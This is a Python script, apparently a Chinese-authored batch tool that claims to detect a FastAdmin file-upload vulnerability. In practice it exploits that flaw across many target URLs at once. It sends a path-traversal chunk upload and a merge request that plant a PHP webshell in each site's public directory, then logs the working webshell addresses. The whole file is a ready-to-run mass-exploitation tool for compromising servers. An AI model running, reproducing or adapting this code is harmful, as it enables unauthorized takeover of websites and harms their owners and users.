import sys
import requests
from time import time
from json import loads
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from datetime import datetime
from tqdm import tqdm  # 添加进度条支持

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
}

def print_banner():
    """打印工具名称和版本信息"""
    banner = """
  _____           _        __    _          _ _ 
 |  ___|_ _ _ __ | |_     / /_ _| |__   ___| | |
 | |_ / _` | '_ \| __|   / / _` | '_ \ / _ \ | |
 |  _| (_| | | | | |_   / / (_| | |_) |  __/ | |
 |_|  \__,_|_| |_|\__| /_/ \__,_|_.__/ \___|_|_|
                                                
FastAdmin 文件上传漏洞批量检测工具 v1.0
作者: 偷心
"""
    print(banner)

def log_success(url, webshell_url):
    """记录成功结果到 success.log"""
    with open("success.log", "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {url} -> Webshell: {webshell_url}\n")

def log_failed(url, reason):
    """记录失败结果到 failed.log"""
    with open("failed.log", "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {url} -> {reason}\n")

def upload_chunk(url, cookie=None, pbar=None):
    try:
        # 标准化URL格式
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        url = url.rstrip('/')
        
        upload_url = url + '/index/ajax/upload'
        file = {
            'file': ('%d.php' % time(), open('hhh.php', 'rb'), 'application/octet-stream')
        }
        chunk_id = time()
        data_ = {
            'chunkid': '../../public/%d.php' % chunk_id,
            'chunkindex': 0,
            'chunkcount': 1
        }
        
        # 设置请求头
        current_headers = headers.copy()
        if cookie:
            current_headers['Cookie'] = cookie
        
        resp = requests.post(
            upload_url,
            headers=current_headers,
            files=file,
            data=data_,
            timeout=10
        )
        
        if resp.status_code == 200:
            result = loads(resp.text)
            if result['code'] == 1 and result['msg'] == '' and result['data'] is None:
                if merge_file(upload_url, chunk_id, cookie):
                    webshell_url = f"{url}/{int(chunk_id)}.php"
                    print(f"\n[+] 成功: {webshell_url}")  # 打印成功的webshell地址
                    log_success(url, webshell_url)
                    return {"url": url, "status": "Vulnerable", "webshell": webshell_url}
            else:
                log_failed(url, result.get('msg', "Not vulnerable"))
        else:
            log_failed(url, f"HTTP {resp.status_code}")
    
    except requests.exceptions.RequestException as e:
        log_failed(url, str(e))
    except Exception as e:
        log_failed(url, str(e))
    finally:
        if pbar:
            pbar.update(1)  # 更新进度条
    
    return {"url": url, "status": "Not vulnerable"}

def merge_file(upload_url, chunk_id, cookie=None):
    try:
        data_ = {
            'action': 'merge',
            'chunkid': '../../public/%d.php' % chunk_id,
            'chunkindex': 0,
            'chunkcount': 1,
            'filename': '%d.php-0.part' % chunk_id
        }
        
        current_headers = headers.copy()
        if cookie:
            current_headers['Cookie'] = cookie
        
        resp = requests.post(
            upload_url,
            headers=current_headers,
            data=data_,
            timeout=10
        )
        
        return resp.status_code == 200
    except:
        return False

def process_targets(targets, cookie=None, threads=5):
    results = []
    total_targets = len(targets)
    
    # 创建进度条
    with tqdm(total=total_targets, desc="处理进度", unit="目标") as pbar:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(upload_chunk, target, cookie, pbar): target 
                for target in targets
            }
            for future in as_completed(futures):
                try:
                    results.append(future.result())
                except Exception:
                    pass
    return results

def main():
    print_banner()  # 显示工具横幅
    
    parser = argparse.ArgumentParser(description='FastAdmin 文件上传漏洞批量检测工具')
    parser.add_argument('target', nargs='*', help='单个URL或包含URL列表的文件')
    parser.add_argument('-c', '--cookie', help='设置Cookie头')
    parser.add_argument('-t', '--threads', type=int, default=5, help='并发线程数 (默认: 5)')
    parser.add_argument('-f', '--file', help='从文件读取URL列表')
    
    args = parser.parse_args()
    
    targets = []
    
    if args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url and not url.startswith('#'):
                        targets.append(url)
        except IOError:
            print("[-] 无法读取文件，请检查文件路径")
            sys.exit(1)
    elif args.target:
        targets = args.target
    else:
        parser.print_help()
        sys.exit(1)
    
    if not targets:
        print("[-] 没有提供有效的目标URL")
        sys.exit(1)
    
    print(f"[+] 开始处理 {len(targets)} 个目标，使用 {args.threads} 个线程...")
    results = process_targets(targets, args.cookie, args.threads)
    
    print("\n[+] 处理完成！")
    print(f"[+] 成功利用: {len([r for r in results if r.get('status') == 'Vulnerable'])}")
    print(f"[-] 失败目标: {len([r for r in results if r.get('status') != 'Vulnerable'])}")

if __name__ == "__main__":
    main()
